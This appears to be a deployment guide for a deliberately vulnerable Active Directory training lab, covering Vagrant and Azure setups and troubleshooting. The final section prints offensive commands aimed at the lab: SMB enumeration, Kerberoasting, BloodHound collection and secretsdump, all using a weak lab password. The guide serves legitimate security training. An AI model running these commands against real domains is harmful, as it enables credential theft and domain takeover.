# Deployment guide

Detailed walkthrough for both paths, plus troubleshooting.

---

## Prerequisites

### Common
```bash
# Ansible + collections (both paths need these)
pip install ansible
make deps     # == ansible-galaxy collection install -r ansible/requirements.yml
```

### Local path
- [VirtualBox](https://www.virtualbox.org/) 7.x
- [Vagrant](https://www.vagrantup.com/) 2.4+
- ~50 GB free disk (Windows base boxes are large)

### Cloud path
- [Terraform](https://developer.hashicorp.com/terraform) 1.5+
- [Azure CLI](https://learn.microsoft.com/cli/azure/) — run `az login` first
- An Azure subscription (student credits work great)

---

## Local (Vagrant) — step by step

1. `make deps` (once)
2. `make up-local`
   - `vagrant up` downloads base boxes and boots HYDRA-DC, THEPUNISHER, SPIDERMAN
   - Ansible then runs `site.yml` against them over forwarded WinRM ports
3. Verify: `make check` (or `nxc smb 10.0.2.10 10.0.2.11 10.0.2.12`)

**Low on disk?** Build incrementally:
```bash
cd vagrant
vagrant up hydra-dc
vagrant up thepunisher
vagrant up spiderman
cd .. && make configure INV=vagrant.ini
```

---

## Cloud (Terraform) — step by step

1. `az login`
2. Configure variables:
   ```bash
   cp terraform/terraform.tfvars.example terraform/terraform.tfvars
   ```
   Edit `terraform.tfvars`:
   - `allowed_source_ip` = your public IP `/32` (`curl ifconfig.me`)
   - `admin_password` = strong password (Azure needs 12+ chars, 3 of 4 classes)
3. `make up-azure` → `terraform init && terraform apply`
4. Grab the public IPs:
   ```bash
   cd terraform && terraform output ansible_inventory_hint
   ```
   Paste into `ansible/inventory/azure.ini` (and set `ansible_password` to match tfvars).
5. `make configure INV=azure.ini`
6. Verify over RDP or WinRM.

### Saving credits
```bash
# stop (keeps disks, stops compute billing)
az vm deallocate --ids $(az vm list -g rg-adlab-marvel --query "[].id" -o tsv)
# start again later
az vm start      --ids $(az vm list -g rg-adlab-marvel --query "[].id" -o tsv)
# nuke everything
make destroy-azure
```

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `ansible-galaxy` can't reach Galaxy | Check network/proxy; collections are required |
| WinRM connection refused (Vagrant) | Box still booting; re-run `make configure`. Check forwarded ports 55985–55987 |
| WinRM refused (Azure) | The CustomScript WinRM extension may still be applying; wait ~2 min. Confirm NSG allows your IP on 5986 |
| DC promotion hangs | Normal — `microsoft.ad.domain` reboots and waits. Give it several minutes |
| Workstation join fails: domain not found | DNS not pointing at DC. The role sets this, but confirm the DC is fully up first |
| Azure image not available | Win11 SKUs vary by region/offer; adjust `source_image_reference` in `vms.tf` |
| Terraform: quota exceeded | Student subscriptions cap vCPUs; use `Standard_B1s` or build fewer VMs |

---

## What to change for your own lab

Everything lives in [`ansible/group_vars/all.yml`](../ansible/group_vars/all.yml):
- `domain_name`, hostnames, IPs
- `domain_users` (add/remove, set passwords, flag Domain Admins)
- `spn` (Kerberoast target)
- `disable_defender` / `disable_firewall` / `disable_llmnr` toggles

Change it once; both Vagrant and Terraform paths pick it up.

---

## One-button Azure deploy (recommended)

The fastest path. From your Kali:
```bash
az login
./deploy-azure.sh
```
On first run it auto-creates `terraform/terraform.tfvars` (detects your public IP, prompts for a
VM admin password). On later runs it refreshes your IP automatically if it changed. When it finishes
it prints `ATTACK_FROM_KALI.txt` with the public IPs and copy-paste attack commands.

Teardown: `./destroy-azure.sh`

## Attacking from your home Kali

The NSG allows your IP to the AD attack ports (88/135/139/389/445/636/3268/5985-5986/3389 + the RPC
dynamic range), so these work straight from home:
```bash
# add the DC to /etc/hosts first (ATTACK_FROM_KALI.txt gives the exact line)
nxc smb <dc-ip> -u fcastle -p Password1 -d MARVEL.local
impacket-GetUserSPNs -request -dc-ip <dc-ip> MARVEL.local/fcastle:Password1
bloodhound-python -u fcastle -p Password1 -d MARVEL.local -ns <dc-ip> -c All --zip
impacket-secretsdump MARVEL.local/SQL_Service:'<cracked-pw>'@<dc-ip>
```

### Broadcast attacks (LLMNR / relay / mitm6)

These need to be on the same layer-2 segment as the victims, so they won't work from home over the
internet. Two options:
1. **Deploy a Kali in Azure** on the same subnet — add a small Linux VM to `vms.tf` in `snet-adlab`,
   then SSH/RDP to it and run Responder/ntlmrelayx there.
2. **Point-to-site VPN** into the VNet so your home Kali joins `10.0.2.0/24` virtually.

For the PEH/PNPT path you've already done LLMNR + relay locally, so routed access from home covers
the rest of the course (enum → Kerberoast → DCSync → post-ex).
